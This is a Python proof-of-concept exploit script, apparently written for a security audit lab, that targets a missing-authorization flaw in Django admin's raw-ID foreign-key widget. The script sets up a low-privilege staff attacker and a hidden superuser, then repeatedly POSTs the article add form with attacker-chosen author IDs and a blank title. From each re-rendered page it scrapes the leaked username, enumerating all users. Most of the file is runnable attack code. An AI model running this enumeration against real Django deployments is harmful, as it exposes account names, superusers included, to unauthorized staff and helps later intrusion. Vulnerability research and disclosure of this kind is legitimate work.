#!/usr/bin/env python3
"""
VULN-007 — Admin ForeignKeyRawIdWidget discloses an arbitrary related object's
           str() with NO permission check (staff IDOR → auth.User enumeration).

Target        : Django 6.2.0a0  (commit 9e06baf, bind-mounted at /opt/django_src)
Vulnerable code: targets/django/django/contrib/admin/widgets.py:211-231
                 (`ForeignKeyRawIdWidget.label_and_url_for_value`)
Class         : CWE-862 Missing Authorization / CWE-639 IDOR

The flaw
--------
A model whose admin declares `raw_id_fields` renders `ForeignKeyRawIdWidget`.
When that admin form is re-rendered *bound* (e.g. after a validation error),
the widget takes the attacker-typed FK value straight from POST and calls:

    obj = self.rel.model._default_manager.using(self.db).get(**{key: value})  # :214
    ...
    return Truncator(obj).words(14), url                                      # :231

Line 214 is an UNSCOPED lookup on the *related* model by an attacker-chosen PK,
and line 231 renders that object's str() into the page. There is NO
has_view_permission / has_change_permission anywhere on this path — contrast the
hardened sibling AutocompleteJsonView (autocomplete.py:121-123) which *does* gate
related-object reads. Because `ArticleAdmin.raw_id_fields = ["author"]` and
`Article.author` → auth.User (whose __str__ is the username), a staff user with
rights only on `labapp` can read the username of ANY auth.User — including
superusers they have zero rights over — by iterating PKs.

Exploitation idea
-----------------
1. Provision a low-privilege staff user that can add Articles but has NO
   permission on auth.User (cannot open the user changelist at all).
2. As that user, POST /admin/labapp/article/add/ with `author=<pk>` and a blank
   required field so the form re-renders bound; scrape the leaked username.
3. Walk PKs → full auth.User enumeration, including a "hidden" superuser the
   attacker provably cannot otherwise see.

A successful run proves cross-model authorization is missing: the attacker reads
usernames of accounts they are 403-forbidden from viewing directly.
"""

import json
import os
import re
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import _common as C  # noqa: E402


def provision(suffix):
    """SETUP via the app's own ORM (in-container): a low-priv staff attacker and
    a hidden superuser victim. Returns (attacker_user, attacker_pass, ground_truth)."""
    attacker = f"mod_{suffix}"
    apass = f"Pw_{suffix}Aa1!"
    victim_su = f"victimsu_{suffix}"
    driver = C.django_driver(f"""
import json
from django.contrib.auth.models import User, Permission
from django.contrib.contenttypes.models import ContentType
from labapp.models import Article

# Attacker: is_staff, only labapp.article add/change/view — NOTHING on auth.User.
att, _ = User.objects.get_or_create(username="{attacker}")
att.set_password("{apass}")
att.is_staff = True
att.is_superuser = False
att.save()
att.user_permissions.clear()
ct = ContentType.objects.get_for_model(Article)
for codename in ("add_article", "change_article", "view_article"):
    att.user_permissions.add(Permission.objects.get(content_type=ct, codename=codename))

# Hidden superuser victim the attacker must NOT be able to see directly.
vic, _ = User.objects.get_or_create(username="{victim_su}")
vic.set_password("Str0ng_{suffix}!")
vic.is_staff = True
vic.is_superuser = True
vic.email = "{victim_su}@secret.invalid"
vic.save()

# Ground truth: every user pk->username (what a *complete* enumeration would yield).
truth = {{u.pk: u.username for u in User.objects.order_by("pk")}}
print("JSON:" + json.dumps({{"attacker_pk": att.pk, "victim_pk": vic.pk, "truth": truth}}))
""")
    cp = C.dexec(driver)
    line = next((l for l in cp.stdout.splitlines() if l.startswith("JSON:")), None)
    if not line:
        raise RuntimeError(f"provision failed:\nSTDOUT:{cp.stdout}\nSTDERR:{cp.stderr}")
    data = json.loads(line[len("JSON:"):])
    return attacker, apass, data


def leak_username(session, pk):
    """As the attacker, POST the add form with author=<pk> + blank title; return
    the username the bound-re-render widget leaks for that pk (or None)."""
    add_url = f"{C.BASE_URL}/admin/labapp/article/add/"
    token = C.get_form_csrf(session, add_url)
    r = session.post(
        add_url,
        data={
            "csrfmiddlewaretoken": token,
            "author": str(pk),          # <-- attacker-chosen auth.User PK (the sink input)
            "title": "",                # blank required field -> form invalid -> bound re-render
            "slug": "", "body": "", "category": "", "metadata": "{}",
            "comments-TOTAL_FORMS": "0", "comments-INITIAL_FORMS": "0",
            "comments-MIN_NUM_FORMS": "0", "comments-MAX_NUM_FORMS": "1000",
        },
        headers={"Referer": add_url},
        timeout=15,
    )
    # The widget renders: <strong><a href="/admin/auth/user/<pk>/change/">USERNAME</a></strong>
    m = re.search(
        r'id="id_author".*?<strong><a href="/admin/auth/user/%d/change/">([^<]+)</a></strong>' % pk,
        r.text, re.S,
    )
    return (r, m.group(1) if m else None)


def main():
    C.banner("VULN-007",
             "ForeignKeyRawIdWidget staff IDOR → auth.User enumeration",
             "contrib/admin/widgets.py:214 unscoped _default_manager.get(pk=attacker)")
    suffix = C.rand_suffix()

    C.log("SETUP", f"provisioning low-priv staff attacker mod_{suffix} (labapp only) "
                   f"+ hidden superuser victimsu_{suffix} via the app ORM")
    attacker, apass, data = provision(suffix)
    truth = {int(k): v for k, v in data["truth"].items()}
    victim_pk = data["victim_pk"]
    C.log("SETUP", f"attacker pk={data['attacker_pk']}, hidden-superuser pk={victim_pk} "
                   f"({truth[victim_pk]}); {len(truth)} users exist in total")

    s = C.new_session()
    C.admin_login(s, user=attacker, password=apass)
    C.log("STEP", f"logged into /admin/ as {attacker} (is_staff, no auth.User perms)")

    # Prove the attacker genuinely cannot view users the normal way.
    r_denied = s.get(f"{C.BASE_URL}/admin/auth/user/", timeout=15)
    C.log("STEP", f"attacker GET /admin/auth/user/ -> HTTP {r_denied.status_code} "
                  f"(expected 403: no view perm on auth.User)")
    if r_denied.status_code == 200:
        return C.verdict("VULN-007", "FAILED",
                         "attacker unexpectedly has direct auth.User access; not an IDOR")

    C.log("STEP", "abusing the raw_id widget: POST article/add/ with author=<pk>, blank title")
    leaked = {}
    first_req = first_resp = None
    for pk in sorted(truth):
        resp, uname = leak_username(s, pk)
        if first_req is None:
            first_req = (
                f"POST /admin/labapp/article/add/ HTTP/1.1\nHost: localhost:20796\n"
                f"Cookie: sessionid=<attacker mod_{suffix}>; csrftoken=<t>\n"
                f"Content-Type: application/x-www-form-urlencoded\nReferer: {C.BASE_URL}/admin/labapp/article/add/\n\n"
                f"csrfmiddlewaretoken=<t>&author={pk}&title=&slug=&body=&category=&metadata=%7B%7D"
                f"&comments-TOTAL_FORMS=0&comments-INITIAL_FORMS=0&comments-MIN_NUM_FORMS=0&comments-MAX_NUM_FORMS=1000\n"
            )
            first_resp = resp.text
        if uname:
            leaked[pk] = uname
            tag = " <== HIDDEN SUPERUSER" if pk == victim_pk else ""
            C.log("PROOF", f"author={pk} leaked username -> {uname!r}{tag}")

    # Persist evidence from the decisive (hidden-superuser) request.
    C.save_http(C.here(__file__), first_req,
                f"[first probe response truncated to the author widget region]\n"
                + _slice_author(first_resp))

    # Verify: attacker (no auth.User perm) recovered the hidden superuser's username.
    if leaked.get(victim_pk) == truth[victim_pk]:
        C.log("PROOF", f"attacker with ZERO auth.User rights recovered hidden superuser "
                       f"{truth[victim_pk]!r} (pk={victim_pk}) purely via the widget")
        C.log("OK", f"exploit confirmed — enumerated {len(leaked)}/{len(truth)} usernames "
                    f"incl. superuser(s); no permission on auth.User was ever held")
        return C.verdict("VULN-007", "CONFIRMED",
                         f"low-priv staff enumerated {len(leaked)} auth.User usernames "
                         f"(incl. hidden superuser) via raw_id widget, bypassing authz")
    return C.verdict("VULN-007", "FAILED",
                     "hidden superuser username was not leaked; mechanism did not fire")


def _slice_author(html):
    i = html.find('id="id_author"')
    return html[i - 100: i + 400] if i >= 0 else html[:600]


if __name__ == "__main__":
    sys.exit(main())
